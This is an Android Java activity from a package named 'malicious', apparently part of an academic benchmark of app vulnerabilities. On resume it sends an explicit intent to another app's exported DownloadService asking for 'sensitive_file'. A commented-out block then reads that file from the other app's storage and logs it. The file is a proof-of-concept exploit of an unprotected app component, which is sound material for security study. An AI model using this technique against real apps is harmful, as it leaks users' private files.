package edu.ksu.cs.malicious;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "android.permission.READ_EXTERNAL_STORAGE already granted");
        } else {
            Log.d(TAG, "need android.permission.READ_EXTERNAL_STORAGE permission");
            try{
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, 100);
            }
            catch(Exception e){
                e.printStackTrace();
            }

        }
    }

    @Override
    protected void onResume(){
        super.onResume();
        Intent intent = new Intent();
        intent.setClassName("edu.ksu.cs.benign","edu.ksu.cs.benign.DownloadService");
        intent.setPackage("edu.ksu.cs.benign");
        intent.putExtra("filename","sensitive_file");
        startService(intent);
        /*File file = new File(getExternalFilesDir(null),"sensitive_file");
        File newFile = new File(file.getAbsolutePath().replace("edu.ksu.cs.malicious","edu.ksu.cs.benign"));
        try {
            InputStreamReader is = new InputStreamReader(new FileInputStream(newFile));
            BufferedReader b = new BufferedReader(is);
            String line;
            while((line = b.readLine()) != null){
                Log.d(TAG,line);
            }
        }
        catch(IOException e){
            e.printStackTrace();
        }*/
    }
}
